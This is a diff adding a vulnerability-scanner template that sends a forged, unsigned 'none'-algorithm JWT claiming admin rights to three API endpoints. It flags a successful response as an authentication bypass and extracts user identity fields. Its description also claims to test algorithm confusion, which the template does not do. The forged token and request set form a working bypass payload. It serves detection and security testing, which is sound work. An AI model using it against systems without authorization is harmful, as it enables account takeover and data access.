@@ -1,0 +1,61 @@
+id: generic-jwt-none-alg
+
+info:
+  name: JWT None Algorithm / Algorithm Confusion Attack
+  author: pt-zenity
+  severity: critical
+  description: |
+    Tests for JWT (JSON Web Token) vulnerabilities including the "none" algorithm
+    attack and algorithm confusion (RS256 to HS256). If vulnerable, attackers
+    can forge JWT tokens to bypass authentication and access protected resources.
+  reference:
+    - https://portswigger.net/web-security/jwt
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
+    cvss-score: 9.1
+    cwe-id: CWE-327
+  tags: jwt,auth,critical,bypass,token
+
+http:
+  - raw:
+      - |
+        GET /api/me HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InB0LXplbml0eSIsImFkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjJ9.
+        Accept: application/json
+
+      - |
+        GET /api/user HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InB0LXplbml0eSIsImFkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjJ9.
+        Accept: application/json
+
+      - |
+        GET /api/profile HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6InB0LXplbml0eSIsImFkbWluIjp0cnVlLCJpYXQiOjE1MTYyMzkwMjJ9.
+        Accept: application/json
+
+    stop-at-first-match: false
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+      - type: dsl
+        dsl:
+          - "!contains(tolower(body), 'unauthorized') && !contains(tolower(body), 'invalid token') && !contains(tolower(body), 'invalid signature')"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - '"(id|sub|email|username|name|role|admin)"\s*:\s*["\d]'
